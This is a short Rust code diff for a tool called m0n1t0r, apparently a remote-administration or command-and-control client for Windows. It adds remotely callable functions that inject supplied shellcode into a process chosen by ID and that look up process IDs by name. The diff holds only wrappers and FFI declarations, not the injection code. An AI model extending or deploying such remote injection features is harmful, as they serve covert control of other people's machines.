@@ -1,7 +1,7 @@
-use anyhow::Error;
+use anyhow::anyhow;
 use m0n1t0r_common::{
     process::{self as mcprocess, execute::Output},
-    Result as AppResult,
+    Error, Result as AppResult,
 };
 use remoc::{
     chmux::ReceiverStream,
@@ -68,6 +68,23 @@ impl mcprocess::Agent for AgentObj {
         });
         Ok((stdin_tx, stdout_rx, stderr_rx))
     }
+
+    async fn inject_shellcode_by_id(
+        &self,
+        pid: u32,
+        shellcode: Vec<u8>,
+        ep_offset: u32,
+        parameter: Vec<u8>,
+    ) -> AppResult<()> {
+        match ffi::inject_shellcode_by_id(pid, shellcode, ep_offset, parameter)? {
+            true => Ok(()),
+            false => Err(Error::from(anyhow!("Failed to inject shellcode"))),
+        }
+    }
+
+    async fn get_id_by_name(&self, name: String) -> AppResult<u32> {
+        Ok(ffi::get_id_by_name(name)?.into())
+    }
 }
 
 #[cxx::bridge]
@@ -85,6 +102,15 @@ mod ffi {
         include!("m0n1t0r-client/m0n1t0r-cpp-windows-lib/include/process.h");
 
         fn execute(command: String, args: Vec<String>) -> Result<Output>;
+
+        fn inject_shellcode_by_id(
+            pid: u32,
+            shellcode: Vec<u8>,
+            ep_offset: u32,
+            parameter: Vec<u8>,
+        ) -> Result<bool>;
+
+        fn get_id_by_name(name: String) -> Result<u32>;
     }
 }
 
